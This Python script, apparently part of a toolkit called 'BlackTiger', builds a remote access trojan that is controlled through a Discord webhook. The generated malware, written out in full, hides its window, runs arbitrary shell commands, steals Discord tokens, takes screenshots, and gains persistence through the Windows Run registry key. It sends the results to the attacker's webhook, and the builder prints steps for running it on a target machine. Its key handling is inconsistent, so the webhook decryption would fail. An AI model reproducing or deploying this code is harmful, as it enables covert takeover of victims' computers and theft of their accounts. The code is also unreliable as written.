mport os, sys, time, base64, random, string, platform, socket, json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

def run():
    print("\n" + "="*60)
    print("DISCORD RAT BUILDER - AES ENCRYPTED")
    print("="*60)
    
    print("[!] This creates an AES-encrypted Remote Access Tool")
    print("[!] Commands: shell [cmd], tokens, sysinfo, pc_info, screenshot")
    print("[!] The RAT will send PC info when it starts")
    print("="*60)
    
    webhook = input("\nWebhook URL: ").strip()
    
    if not webhook.startswith('https://discord.com/api/webhooks/'):
        print("\n[!] Invalid webhook URL!")
        print("[!] Format: https://discord.com/api/webhooks/ID/TOKEN")
        input("\nPress Enter to continue...")
        return
    
    filename = input("Filename [discord_rat]: ").strip() or "discord_rat"
    
    print("\n[+] Building AES-encrypted Discord RAT...")
    
    # Generate AES key from webhook
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(webhook.encode()))
    
    # Create Fernet cipher
    cipher = Fernet(key)
    
    # Encrypt webhook for storage in the RAT
    encrypted_webhook = cipher.encrypt(webhook.encode())
    encrypted_webhook_b64 = base64.b64encode(encrypted_webhook).decode()
    salt_b64 = base64.b64encode(salt).decode()
    
    code = f'''#!/usr/bin/env python3
# Discord RAT - AES Encrypted

import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes, socket, getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

# Encrypted webhook data
ENCRYPTED_WEBHOOK = base64.b64decode("{encrypted_webhook_b64}")
SALT = base64.b64decode("{salt_b64}")

# Decrypt webhook on startup
def decrypt_webhook():
    try:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=SALT,
            iterations=100000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(b"discord_rat_key"))
        cipher = Fernet(key)
        return cipher.decrypt(ENCRYPTED_WEBHOOK).decode()
    except:
        # Fallback - try with a different key derivation
        try:
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=SALT,
                iterations=50000,
                backend=default_backend()
            )
            key = base64.urlsafe_b64encode(kdf.derive(b"discord_rat_key"))
            cipher = Fernet(key)
            return cipher.decrypt(ENCRYPTED_WEBHOOK).decode()
        except:
            return None

WEBHOOK = decrypt_webhook()
IS_WIN = platform.system() == "Windows"

def send(data):
    if not WEBHOOK:
        return
    try:
        if len(data) > 1900:
            for i in range(0, len(data), 1900):
                requests.post(WEBHOOK, json={{'content': data[i:i+1900]}})
        else:
            requests.post(WEBHOOK, json={{'content': data}})
    except:
        pass

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[+] Command executed successfully (no output)"
        return output[:4000]
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as e:
        return f"[!] Error: {{str(e)}}"

def get_pc_info():
    info = []
    info.append("=== SYSTEM INFORMATION ===")
    info.append(f"Computer Name: {{platform.node()}}")
    info.append(f"OS: {{platform.system()}} {{platform.release()}}")
    info.append(f"OS Version: {{platform.version()}}")
    info.append(f"Architecture: {{platform.machine()}}")
    info.append(f"User: {{os.getlogin()}}")
    info.append(f"CPU: {{os.cpu_count()}} cores")
    
    try:
        import psutil
        info.append(f"RAM: {{round(psutil.virtual_memory().total / 1024**3, 2)}} GB")
        info.append(f"RAM Used: {{round(psutil.virtual_memory().used / 1024**3, 2)}} GB")
        info.append(f"RAM Free: {{round(psutil.virtual_memory().free / 1024**3, 2)}} GB")
        info.append(f"RAM Usage: {{psutil.virtual_memory().percent}}%")
        info.append(f"Disk Total: {{round(psutil.disk_usage('/').total / 1024**3, 2)}} GB")
        info.append(f"Disk Used: {{round(psutil.disk_usage('/').used / 1024**3, 2)}} GB")
        info.append(f"Disk Free: {{round(psutil.disk_usage('/').free / 1024**3, 2)}} GB")
        info.append(f"Disk Usage: {{psutil.disk_usage('/').percent}}%")
    except:
        pass
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        info.append(f"Public IP: {{ip}}")
    except:
        pass
    
    try:
        hostname = socket.gethostname()
        info.append(f"Local IP: {{socket.gethostbyname(hostname)}}")
    except:
        pass
    
    info.append(f"Python Version: {{sys.version}}")
    info.append(f"Working Directory: {{os.getcwd()}}")
    info.append(f"Processor: {{platform.processor()}}")
    info.append("="*30)
    
    return "\\n".join(info)

def steal_tokens():
    tokens = []
    paths = []
    if IS_WIN:
        paths = glob.glob(os.path.expandvars("%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordptb\\\\Local Storage\\\\leveldb\\\\*.log"))
    else:
        paths = glob.glob(os.path.expanduser("~/.config/discord/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordptb/Local Storage/leveldb/*.log"))
    
    for p in paths:
        if os.path.exists(p):
            try:
                with open(p, 'r', errors='ignore') as f:
                    for line in f:
                        matches = re.findall(r'[\\w-]{{24,}}\\.[\\w-]{{6,}}\\.[\\w-]{{27,}}', line)
                        tokens.extend(matches)
            except:
                pass
    
    return list(set(tokens))

def take_screenshot():
    try:
        import PIL.ImageGrab
        img = PIL.ImageGrab.grab()
        img_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'screenshot.png')
        img.save(img_path)
        
        with open(img_path, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    except:
        return "[!] Screenshot failed"

def persist_windows():
    if not IS_WIN:
        return
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DiscordRAT", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(handle)
    except:
        pass

def main():
    if IS_WIN:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    if not WEBHOOK:
        send("[!] Failed to decrypt webhook")
        return
    
    # Send connection notification
    try:
        send("[+] RAT CONNECTED!")
        send("[+] Sending system information...")
        time.sleep(1)
        pc_info = get_pc_info()
        send(pc_info)
        send("[+] RAT is ready and waiting for commands")
        send("[+] Type 'help' for commands")
    except:
        pass
    
    while True:
        try:
            r = requests.get(WEBHOOK, timeout=5)
            if r.status_code == 200 and r.text:
                cmd = r.text.strip()
                
                if cmd.startswith('shell '):
                    result = execute_cmd(cmd[6:])
                    send(result)
                    
                elif cmd == 'tokens':
                    tokens = steal_tokens()
                    if tokens:
                        send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens))
                    else:
                        send("[!] No tokens found")
                        
                elif cmd == 'sysinfo':
                    info = get_pc_info()
                    send(info)
                    
                elif cmd == 'pc_info':
                    info = get_pc_info()
                    send(info)
                    
                elif cmd == 'screenshot':
                    img = take_screenshot()
                    if img:
                        send("[+] Screenshot captured\\n{{img[:500]}}...")
                    else:
                        send("[!] Screenshot failed")
                        
                elif cmd == 'persist':
                    persist_windows()
                    send("[+] Persistence enabled")
                    
                elif cmd == 'connected':
                    send("[+] RAT is connected and running")
                    pc_info = get_pc_info()
                    send(pc_info)
                    
                elif cmd == 'help':
                    help_text = """
=== DISCORD RAT COMMANDS ===
shell [cmd]  - Execute system command
tokens       - Steal Discord tokens
sysinfo      - Get system information
pc_info      - Get detailed PC information
screenshot   - Take screenshot
persist      - Enable persistence
connected    - Check if RAT is connected
help         - Show this help
exit         - Stop the RAT
"""
                    send(help_text)
                    
                elif cmd == 'exit':
                    send("[!] RAT shutting down...")
                    sys.exit(0)
                    
                else:
                    send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
                    
        except Exception as e:
            time.sleep(5)
        
        time.sleep(5)

if __name__ == "__main__":
    main()
'''
    
    # Save the RAT
    out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
    os.makedirs(out_dir, exist_ok=True)
    
    py_path = os.path.join(out_dir, filename + ".py")
    with open(py_path, 'w') as f:
        f.write(code)
    
    print(f"\n[+] RAT saved to: {py_path}")
    
    # Create a BAT file for easy execution
    bat_path = os.path.join(out_dir, filename + ".bat")
    with open(bat_path, 'w') as f:
        f.write(f'''@echo off
echo Starting Discord RAT...
python "{py_path}"
pause
''')
    
    print(f"[+] Batch file saved to: {bat_path}")
    
    print("\n" + "="*60)
    print("HOW TO USE")
    print("="*60)
    print("1. Run the RAT on the target machine:")
    print(f"   python {filename}.py")
    print("\n2. The webhook URL is AES-encrypted in the code")
    print("3. When the RAT starts, it will send:")
    print("   - Connection notification")
    print("   - PC information (OS, CPU, RAM, Disk, IP)")
    print("\n4. Send commands via webhook:")
    print("   - Go to your Discord webhook URL")
    print("   - Send a message with the command")
    print("\n5. Available commands:")
    print("   shell [cmd]  - Execute system command")
    print("   tokens       - Steal Discord tokens")
    print("   sysinfo      - Get system information")
    print("   pc_info      - Get detailed PC information")
    print("   screenshot   - Take screenshot")
    print("   persist      - Enable persistence")
    print("   connected    - Check RAT status")
    print("   help         - Show help")
    print("   exit         - Stop the RAT")
    print("="*60)
    
    print("\n[!] Webhook URL is encrypted with AES-256")
    print("[!] The RAT decrypts it at runtime")
    
    input("\nPress Enter to continue...")

if __name__ == "__main__":
    run()
